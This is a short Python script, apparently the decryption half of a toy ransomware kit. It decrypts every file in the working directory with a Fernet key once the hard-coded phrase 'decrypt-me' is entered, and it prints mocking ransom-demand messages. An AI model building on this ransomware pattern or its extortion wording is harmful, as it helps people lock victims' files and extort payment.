#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "decrypt-me"

enter_phrase = input("Enter the secret phrase to decrypt your files: ")

if enter_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Congrats!!! Your files are decrypted. Thanks for the $100,000.")

else:
    print("Stop trying to enter the wrong phrase(s). You must send me the demanded dollars to get the secret phrase. HAHAHAHA!!!")
